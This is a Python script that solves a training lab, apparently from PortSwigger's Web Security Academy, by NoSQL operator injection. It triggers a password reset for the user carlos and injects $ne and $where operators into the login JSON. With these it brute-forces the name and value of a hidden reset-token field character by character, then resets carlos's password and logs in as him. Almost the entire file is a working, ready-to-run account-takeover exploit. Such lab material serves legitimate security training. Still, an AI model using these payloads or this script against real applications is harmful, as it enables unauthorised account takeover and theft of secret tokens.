###################################################################################
#
# Lab: Exploiting NoSQL operator injection to extract unknown fields
#
# Hack Steps: 
#      1. Fetch the forgot-password page
#      2. Extract the csrf token and session cookie
#      3. Make a forgot-password request for carlos
#      4. Inject an operator and payload into the login JSON object to determine
#         the length of the unknown field name
#      5. Modify the payload to brute force the field name
#      6. Modify the payload to determine the length of the field value
#      7. Modify the payload to brute force the field value
#      8. Fetch the forgot-password page with the field name and its value
#         as a query pararmeter
#      9. Extract the csrf token and session cookie
#      10. Make a reset password request for carlos
#      11. Login as carlos with the new password
#      12. Fetch the carlos profile
#
###################################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a1b00cd0460b44981b3610a00c40021.web-security-academy.net"

FIELD_NUM = 4  # The field number we want to extract, you may need to change this to 3 depending on the lab setup

NEW_PASSWORD = "Hacked" # You can change this to what you want

def main():
    print("‚¶ó#‚¶ò Injection parameter: " + Fore.YELLOW + "login JSON object")
    print(Fore.WHITE + "‚¶ó1‚¶ò Fetching the forgot-password page.. ", end="", flush=True)

    forgot_password_page = fetch("/forgot-password")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó2‚¶ò Extracting the csrf token and session cookie.. ", end="", flush=True)


    session = forgot_password_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", forgot_password_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó3‚¶ò Sending a reset password request for carlos.. ", end="", flush=True)

    data = { "username": "carlos", "csrf": csrf_token }
    cookies = { "session": session }
    post_data("/forgot-password", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó4‚¶ò Determining the length of the 3rd field.. ")
    
    field_name_length = determin_length("")

    print(Fore.WHITE + "‚¶ó5‚¶ò Brute force the field name.. ")
    
    field_name = brute_force(field_name_length, "")

    print(Fore.WHITE + "\n‚¶ó6‚¶ò Determining the length of the 3rd field value.. ")
    
    field_value_length = determin_length(field_name)

    print(Fore.WHITE + "‚¶ó7‚¶ò Brute force the field value.. ")
    
    field_value = brute_force(field_value_length, field_name)
    
    print(Fore.WHITE + "\n‚¶ó8‚¶ò Fetching the forgot-password page with the field name and its value as a query pararmter.. ", end="", flush=True)

    forgot_password = fetch(f"/forgot-password?{field_name}={field_value}")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó9‚¶ò Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = forgot_password.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", forgot_password.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó10‚¶ò Reseting carlos password to " + Fore.BLUE + NEW_PASSWORD + Fore.WHITE +  ".. ", end="", flush=True)

    cookies = { "session": session }
    data = { "username": "carlos", "csrf": csrf_token, field_name: field_value, "new-password-1" : NEW_PASSWORD, "new-password-2" : NEW_PASSWORD }
    post_data("/forgot-password", data, cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó11‚¶ò Logging in as the carlos.. ", end="", flush=True)

    json = { "username": "carlos", "password": NEW_PASSWORD }
    login_as_carlos = post_data("/login", json=json)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó12‚¶ò Fetching the carlos profile.. ", end="", flush=True)
    
    session = login_as_carlos.cookies.get("session")
    cookies = { "session": session }
    fetch("/my-account", cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "üóπ The lab should be marked now as " + Fore.GREEN + "solved")


def determin_length(field_name):
    for length in range(1, 50):
        print(Fore.WHITE + "‚ùØ‚ùØ Checking if length = " + Fore.YELLOW + str(length), flush=True, end='\r')
      
        match field_name:
            case "": # determine the length of the field name
                payload = { "username": "carlos", "password": { "$ne": "" }, "$where": f"Object.keys(this)[{FIELD_NUM}].length == {length}" }
            
            case _: # determine the length of the field value
                payload = { "username": "carlos", "password": { "$ne": "" }, "$where": f"this.{field_name}.length == {length}" }

        injection = post_data("/login", json=payload)
        error_text = re.findall("Invalid username or password", injection.text)
        if len(error_text) == 0:
            print(Fore.WHITE + "‚ùØ‚ùØ Checking if length = " + Fore.YELLOW + str(length) + 
                  Fore.WHITE + " [ Correct: " + Fore.GREEN + str(length) + Fore.WHITE + " ]")

            return length
        else:
            continue
    
    print(Fore.RED + "‚¶ó!‚¶ò Failed to determine the length")
    exit(1)


def brute_force(password_length, field_name):
    correct_value = []

    for position in range(0, password_length):
        for character in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*().":
            print(Fore.WHITE + "‚ùØ‚ùØ Checking if char at position " + Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
            match field_name:
                case "": # brute force field name
                    payload = { "username": "carlos", "password": { "$ne": "" }, "$where": f"Object.keys(this)[{FIELD_NUM}][{position}] == '{character}'" }
               
                case _: # brute force field value
                    payload = { "username": "carlos", "password": { "$ne": "" }, "$where": f"this.{field_name}[{position}] == '{character}'" }
                    
            injection = post_data("/login", json=payload)
            error_text = re.findall("Invalid username or password", injection.text)

            if len(error_text) == 0:
                correct_value.append(character)
                print(Fore.WHITE + "‚ùØ‚ùØ Checking if char at position " + Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct: " +
                        Fore.GREEN + "".join(correct_value) + Fore.WHITE + " ]", flush=True, end='\r')
                
                break
            else:
                continue
    
    return "".join(correct_value)


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "‚¶ó!‚¶ò Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data = None, cookies = None, json = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, json=json, allow_redirects=False)
    except:
        print(Fore.RED + "‚¶ó!‚¶ò Failed to post data to " + path + " through exception")


if __name__ == "__main__":
    main()